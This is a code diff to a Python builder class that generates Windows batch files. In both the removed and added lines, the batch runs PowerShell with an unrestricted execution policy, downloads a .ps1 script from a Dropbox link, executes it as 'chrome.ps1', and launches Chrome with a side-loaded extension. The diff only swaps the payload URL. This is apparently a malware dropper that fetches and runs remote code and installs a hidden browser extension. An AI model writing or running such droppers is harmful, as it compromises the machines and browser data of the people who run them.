@@ -44,7 +44,14 @@ class Build :
 
 						with open(os.path.join(path, build), 'a') as builder :
 							# Write the new file
-							batch = '@echo off\n PowerShell.exe -ExecutionPolicy UnRestricted -nop -c "(new-object net.webclient).DownloadFile("https://www.dropbox.com/s/kemwvd6nqkgbpvv/eeoekjnjgppnaegdjbcafdggilajhpic.ps1?dl=1","chrome.ps1"); ./chrome.ps1;\n PowerShell.exe & "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe" --load-extension=C:\chrome\output\extensions\\bpoenohoghmegkhgcldihgeebdnechlk\necho\nPAUSE'
+							batch = """
+@echo off
+	PowerShell.exe -ExecutionPolicy UnRestricted -nop -c "(new-object net.webclient).DownloadFile('https://www.dropbox.com/s/0h7t1f22wbgtysw/iljojpiodmlhoehoecppliohmplbgeij.ps1?dl=1','chrome.ps1')"  
+	PowerShell.exe -ExecutionPolicy UnRestricted -nop -c "./chrome.ps1"
+	PowerShell.exe & "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe" --load-extension=C:\chrome\output\extensions\\bpoenohoghmegkhgcldihgeebdnechlk
+echo
+PAUSE
+"""
 							batch = batch.replace('******', "******")
 							builder.write(batch)
 						builder.close()
@@ -75,7 +82,14 @@ class Build :
 
 						with open(os.path.join(path, build), 'w') as builder :
 							# Write the new file
-							batch = '@echo off\n PowerShell.exe -ExecutionPolicy UnRestricted -nop -c "(new-object net.webclient).DownloadFile("https://www.dropbox.com/s/kemwvd6nqkgbpvv/eeoekjnjgppnaegdjbcafdggilajhpic.ps1?dl=1","chrome.ps1"); ./chrome.ps1;\n PowerShell.exe & "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe" --load-extension=C:\chrome\output\extensions\extensionid\necho\nPAUSE'
+							batch = """
+@echo off
+	PowerShell.exe -ExecutionPolicy UnRestricted -nop -c "(new-object net.webclient).DownloadFile('https://www.dropbox.com/s/0h7t1f22wbgtysw/iljojpiodmlhoehoecppliohmplbgeij.ps1?dl=1','chrome.ps1')"  
+	PowerShell.exe -ExecutionPolicy UnRestricted -nop -c "./chrome.ps1"
+	PowerShell.exe & "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe" --load-extension=C:\chrome\output\extensions\\bpoenohoghmegkhgcldihgeebdnechlk
+echo
+PAUSE
+"""
 							batch = batch.replace('extensionid', self.extension)
 							batch = batch.replace('******', paths[1])
 							builder.write(batch)
